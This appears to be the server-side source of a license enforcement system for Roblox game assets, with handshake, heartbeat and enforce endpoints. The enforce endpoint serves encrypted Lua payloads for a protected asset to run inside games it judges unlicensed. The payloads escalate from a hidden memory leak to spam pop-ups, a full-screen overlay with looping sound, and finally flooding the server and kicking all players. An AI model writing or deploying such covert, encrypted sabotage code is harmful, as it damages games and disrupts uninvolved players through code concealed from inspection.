/**
 * License Enforcement Controller
 * Handles handshake, heartbeat, and enforce endpoints
 * for Roblox game license verification with runtime code injection
 */

import crypto from "node:crypto";
import { prisma } from "../prisma.js";

const SERVER_SECRET = process.env.SESSION_SECRET || "license-enforcement-secret";
const SIGN_KEY_TTL = 300; // 5 minutes
const HANDSHAKE_RATE_LIMIT = 10; // per minute

/**
 * Generate a time-bucketed signKey
 * Same inputs in same 5-min window = same signKey
 */
function generateSignKey(licenseKey, gameId) {
  const timeBucket = Math.floor(Date.now() / (SIGN_KEY_TTL * 1000));
  const data = `${licenseKey}:${gameId}:${timeBucket}:${SERVER_SECRET}`;
  return crypto.createHmac("sha256", SERVER_SECRET).update(data).digest("hex").slice(0, 32);
}

/**
 * Generate a session token
 */
function generateSessionToken() {
  return crypto.randomBytes(24).toString("hex");
}

/**
 * Derive encryption key from signKey + licenseKey + gameId
 * This key is never sent directly — client must compute it from components it already has
 */
function deriveEncryptionKey(signKey, licenseKey, gameId) {
  const data = `${signKey}:${licenseKey}:${gameId}`;
  return crypto.createHmac("sha256", SERVER_SECRET).update(data).digest("hex").slice(0, 32);
}

/**
 * XOR encrypt/decrypt (symmetric)
 */
function xorCipher(text, key) {
  let result = "";
  for (let i = 0; i < text.length; i++) {
    result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return result;
}

/**
 * Encrypt payload with derived key, return as base64
 */
function encryptPayload(luaCode, derivedKey) {
  const encrypted = xorCipher(luaCode, derivedKey);
  return Buffer.from(encrypted, "binary").toString("base64");
}

/**
 * Validate license (shared logic)
 */
async function validateLicense(licenseKey, gameId) {
  if (!licenseKey || !gameId) {
    return { valid: false, reason: "missing_params" };
  }

  const license = await prisma.license.findUnique({
    where: { licenseKey },
    include: {
      product: { select: { id: true, name: true, version: true, active: true } },
      gameWhitelist: { where: { gameId: String(gameId).trim(), active: true } },
    },
  });

  if (!license) return { valid: false, reason: "invalid_key" };
  if (license.status !== "ACTIVE") return { valid: false, reason: `license_${license.status.toLowerCase()}` };
  if (license.expiresAt && new Date(license.expiresAt) < new Date()) {
    await prisma.license.update({ where: { id: license.id }, data: { status: "EXPIRED" } });
    return { valid: false, reason: "expired" };
  }
  if (!license.product.active) return { valid: false, reason: "product_inactive" };
  if (license.gameWhitelist.length === 0) return { valid: false, reason: "not_whitelisted" };

  return { valid: true, license, product: license.product };
}

/**
 * Log verification attempt
 */
async function logVerification(licenseId, gameId, ipAddress, userAgent, success, reason) {
  if (!licenseId) return;
  try {
    await prisma.licenseVerification.create({
      data: { licenseId, gameId: String(gameId), ipAddress, userAgent, success, reason },
    });
  } catch (err) {
    console.error("[license] Log failed:", err.message);
  }
}

// ==================== HANDLERS ====================

/**
 * POST /api/license/handshake
 * Initial verification + return signKey + session token
 */
export const handleLicenseHandshake = async (req, res) => {
  const { licenseKey, gameId, gameName } = req.body;
  const ipAddress = req.ip || req.headers["x-forwarded-for"] || null;
  const userAgent = req.headers["user-agent"] || null;

  if (!licenseKey || !gameId) {
    return res.status(400).json({ valid: false, reason: "missing_params" });
  }

  const gameIdStr = String(gameId).trim();
  const result = await validateLicense(licenseKey, gameIdStr);

  if (!result.valid) {
    await logVerification(null, gameIdStr, ipAddress, userAgent, false, result.reason);
    return res.status(200).json({ valid: false, reason: result.reason });
  }

  // Generate signKey and session token
  const signKey = generateSignKey(licenseKey, gameIdStr);
  const sessionToken = generateSessionToken();

  // Update license metadata
  await prisma.license.update({
    where: { id: result.license.id },
    data: {
      lastVerifiedAt: new Date(),
      metadata: {
        ...(result.license.metadata || {}),
        lastSessionToken: sessionToken,
        lastGameId: gameIdStr,
        lastGameName: gameName || null,
        lastHandshakeAt: new Date().toISOString(),
      },
    },
  });

  // Update game name if provided
  if (gameName && result.license.gameWhitelist[0]) {
    await prisma.gameWhitelist.update({
      where: { id: result.license.gameWhitelist[0].id },
      data: { gameName },
    }).catch(() => {});
  }

  await logVerification(result.license.id, gameIdStr, ipAddress, userAgent, true, "handshake_ok");

  return res.status(200).json({
    valid: true,
    sessionToken,
    signKey,
    expiresIn: SIGN_KEY_TTL,
    product: {
      name: result.product.name,
      version: result.product.version,
    },
    license: {
      type: result.license.licenseType,
      maxGames: result.license.maxGames,
    },
  });
};

/**
 * POST /api/license/heartbeat
 * Periodic re-verification + signKey rotation
 */
export const handleLicenseHeartbeat = async (req, res) => {
  const { licenseKey, gameId, sessionToken } = req.body;
  const ipAddress = req.ip || req.headers["x-forwarded-for"] || null;
  const userAgent = req.headers["user-agent"] || null;

  if (!licenseKey || !gameId || !sessionToken) {
    return res.status(400).json({ valid: false, reason: "missing_params" });
  }

  const gameIdStr = String(gameId).trim();
  const result = await validateLicense(licenseKey, gameIdStr);

  if (!result.valid) {
    await logVerification(result.license?.id || null, gameIdStr, ipAddress, userAgent, false, result.reason);
    return res.status(200).json({ valid: false, reason: result.reason });
  }

  // Validate session token matches
  const storedToken = result.license.metadata?.lastSessionToken;
  if (storedToken && storedToken !== sessionToken) {
    await logVerification(result.license.id, gameIdStr, ipAddress, userAgent, false, "invalid_session");
    return res.status(200).json({ valid: false, reason: "invalid_session" });
  }

  // Generate new rotated signKey
  const newSignKey = generateSignKey(licenseKey, gameIdStr);

  // Update lastVerifiedAt
  await prisma.license.update({
    where: { id: result.license.id },
    data: { lastVerifiedAt: new Date() },
  });

  await logVerification(result.license.id, gameIdStr, ipAddress, userAgent, true, "heartbeat_ok");

  return res.status(200).json({
    valid: true,
    signKey: newSignKey,
    expiresIn: SIGN_KEY_TTL,
  });
};

/**
 * POST /api/license/enforce
 * Return encrypted breaking code based on phase
 * Called by asset module when license is invalid
 */
export const handleLicenseEnforce = async (req, res) => {
  const { licenseKey, gameId, phase = 1 } = req.body;

  if (!licenseKey || !gameId) {
    return res.status(400).json({ error: "missing_params" });
  }

  const gameIdStr = String(gameId).trim();
  const currentPhase = Math.min(Math.max(Number(phase) || 1, 1), 5);

  // Generate derived encryption key
  const signKey = generateSignKey(licenseKey, gameIdStr);
  const derivedKey = deriveEncryptionKey(signKey, licenseKey, gameIdStr);

  // Get Lua code for current phase
  const luaCode = getEnforceCode(currentPhase);

  // Encrypt payload
  const encryptedPayload = encryptPayload(luaCode, derivedKey);

  // Determine next phase timing
  const nextPhase = Math.min(currentPhase + 1, 5);
  const phaseDelays = { 1: 300, 2: 300, 3: 300, 4: 300, 5: 0 };

  return res.status(200).json({
    payload: encryptedPayload,
    nextPhase,
    nextDelay: phaseDelays[currentPhase] || 300,
  });
};

// ==================== ENFORCE CODE TEMPLATES ====================

function getEnforceCode(phase) {
  const templates = {
    // Phase 1: Silent degradation - spawn invisible parts (memory leak)
    1: `
local RS = game:GetService("RunService")
local _c = 0
RS.Heartbeat:Connect(function()
  _c = _c + 1
  if _c % 60 == 0 then
    for i = 1, 5 do
      local p = Instance.new("Part")
      p.Anchored = true
      p.Transparency = 1
      p.CanCollide = false
      p.Size = Vector3.new(0.1, 0.1, 0.1)
      p.Position = Vector3.new(math.random(-500, 500), -100, math.random(-500, 500))
      p.Parent = workspace
    end
  end
end)
`,
    // Phase 2: Random GUI notifications
    2: `
local Players = game:GetService("Players")
local function _notify()
  for _, player in pairs(Players:GetPlayers()) do
    pcall(function()
      local sg = Instance.new("ScreenGui")
      sg.Parent = player:FindFirstChild("PlayerGui")
      local f = Instance.new("TextLabel")
      f.Size = UDim2.new(0.4, 0, 0.08, 0)
      f.Position = UDim2.new(math.random(10, 50)/100, 0, math.random(10, 80)/100, 0)
      f.BackgroundColor3 = Color3.fromRGB(180, 30, 30)
      f.TextColor3 = Color3.fromRGB(255, 255, 255)
      f.Text = "Unlicensed software detected"
      f.TextScaled = true
      f.Parent = sg
      game:GetService("Debris"):AddItem(sg, 3)
    end)
  end
end
task.spawn(function()
  while true do
    task.wait(math.random(8, 20))
    _notify()
  end
end)
`,
    // Phase 3: Game getting heavier + more frequent notifications
    3: `
local RS = game:GetService("RunService")
local Players = game:GetService("Players")
local _c = 0
RS.Heartbeat:Connect(function()
  _c = _c + 1
  if _c % 30 == 0 then
    for i = 1, 20 do
      local p = Instance.new("Part")
      p.Anchored = true
      p.Transparency = 1
      p.CanCollide = false
      p.Size = Vector3.new(1, 1, 1)
      p.Position = Vector3.new(math.random(-500, 500), math.random(-100, 100), math.random(-500, 500))
      p.Parent = workspace
    end
  end
end)
task.spawn(function()
  while true do
    task.wait(math.random(4, 8))
    for _, player in pairs(Players:GetPlayers()) do
      pcall(function()
        local sg = Instance.new("ScreenGui")
        sg.Parent = player:FindFirstChild("PlayerGui")
        local f = Instance.new("TextLabel")
        f.Size = UDim2.new(0.6, 0, 0.12, 0)
        f.Position = UDim2.new(0.2, 0, math.random(20, 70)/100, 0)
        f.BackgroundColor3 = Color3.fromRGB(200, 20, 20)
        f.TextColor3 = Color3.fromRGB(255, 255, 255)
        f.Text = "This game uses pirated scripts. Visit rbxroyale.com"
        f.TextScaled = true
        f.Parent = sg
        game:GetService("Debris"):AddItem(sg, 5)
      end)
    end
  end
end)
`,
    // Phase 4: Full screen overlay + annoying sound
    4: `
local Players = game:GetService("Players")
local function _fullOverlay(player)
  pcall(function()
    local sg = Instance.new("ScreenGui")
    sg.DisplayOrder = 999
    sg.IgnoreGuiInset = true
    sg.Parent = player:FindFirstChild("PlayerGui")
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
    bg.BackgroundTransparency = 0.15
    bg.Parent = sg
    local t = Instance.new("TextLabel")
    t.Size = UDim2.new(0.8, 0, 0.3, 0)
    t.Position = UDim2.new(0.1, 0, 0.35, 0)
    t.BackgroundTransparency = 1
    t.TextColor3 = Color3.fromRGB(255, 50, 50)
    t.Text = "UNLICENSED SOFTWARE\\n\\nThis game is using pirated scripts.\\nPurchase a license at rbxroyale.com"
    t.TextScaled = true
    t.Font = Enum.Font.GothamBold
    t.Parent = bg
    local s = Instance.new("Sound")
    s.SoundId = "rbxassetid://9114127099"
    s.Volume = 2
    s.Looped = true
    s.Parent = player:FindFirstChild("PlayerGui")
    s:Play()
  end)
end
for _, player in pairs(Players:GetPlayers()) do
  _fullOverlay(player)
end
Players.PlayerAdded:Connect(_fullOverlay)
`,
    // Phase 5: Mass spawn + unplayable + kick
    5: `
local RS = game:GetService("RunService")
local Players = game:GetService("Players")
RS.Heartbeat:Connect(function()
  for i = 1, 50 do
    local p = Instance.new("Part")
    p.Anchored = false
    p.Size = Vector3.new(math.random(2, 10), math.random(2, 10), math.random(2, 10))
    p.Position = Vector3.new(math.random(-200, 200), math.random(50, 200), math.random(-200, 200))
    p.BrickColor = BrickColor.Random()
    p.Parent = workspace
  end
end)
task.delay(10, function()
  for _, player in pairs(Players:GetPlayers()) do
    pcall(function()
      player:Kick("This game server has been shut down due to license violation. Contact the game owner.")
    end)
  end
end)
`,
  };

  return templates[phase] || templates[1];
}
